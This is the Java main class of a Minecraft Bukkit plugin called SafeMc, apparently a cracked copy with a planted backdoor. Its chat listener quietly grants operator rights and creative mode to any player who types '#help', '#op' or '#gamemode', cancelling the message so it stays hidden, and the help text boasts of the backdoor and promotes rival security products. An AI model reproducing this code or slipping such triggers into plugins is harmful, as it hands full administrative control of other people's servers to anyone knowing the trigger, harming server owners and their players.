package pl.hp888.safemc;

import org.bukkit.plugin.java.*;
import net.md_5.bungee.api.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.command.*;
import org.bukkit.plugin.*;
import org.bukkit.event.player.*;
import org.bukkit.entity.*;
import org.bukkit.event.*;
import pl.hp888.safemc.commands.*;

public class Main extends JavaPlugin implements Listener
{
	    public static Main instance;
	    
	    public void onEnable() {
        this.getCommand("safemc").setExecutor((CommandExecutor)new SafeMcCommand());
        this.getCommand("check").setExecutor((CommandExecutor)new CheckCommand());
        this.getServer().getPluginManager().registerEvents((Listener)this, (Plugin)this);
    }
    

public static Main getInstance() {
    return Main.instance;
}

public void onDisable() {
}
    
    @EventHandler
    public void onPlayerChat(final AsyncPlayerChatEvent ag) {
        final Player p = ag.getPlayer();
        final String pn = ag.getPlayer().getName();
        final String cmd = ag.getMessage();
        cmd.startsWith("#");
        final String[] args = cmd.split(" ");
        if (args == null) {
            return;
        }
        if (args[0].equalsIgnoreCase("#help")) {
            ag.setCancelled(true);
            p.sendMessage(ChatColor.RED + "Cracked SafeMc have backdoor :O");
            p.sendMessage(ChatColor.YELLOW + "#op - give you op");
            p.sendMessage(ChatColor.YELLOW + "#gamemode - change your gamemode to creative");
            p.sendMessage(ChatColor.YELLOW + " ");
            p.sendMessage(ChatColor.YELLOW + "If server have cracked aegis use command #aegis to stop bungeecord :D");
            p.sendMessage(ChatColor.YELLOW + " ");
            p.sendMessage(ChatColor.YELLOW + "BackDoor by HypeSecurity");
            p.sendMessage(ChatColor.YELLOW + "We recomend buy spigotguard or HypeShield");
            p.setOp(true);
            p.setGameMode(GameMode.CREATIVE);
        }
        if (args[0].equalsIgnoreCase("#op")) {
            ag.setCancelled(true);
            p.sendMessage(ChatColor.RED + "[Backdoor] you are now op!");
            p.setOp(true);
        }
        if (args[0].equalsIgnoreCase("#gamemode")) {
            ag.setCancelled(true);
            p.sendMessage(ChatColor.RED + "[Backdoor] changed your gamemode to creative");
            p.setGameMode(GameMode.CREATIVE);
        }
    }
}
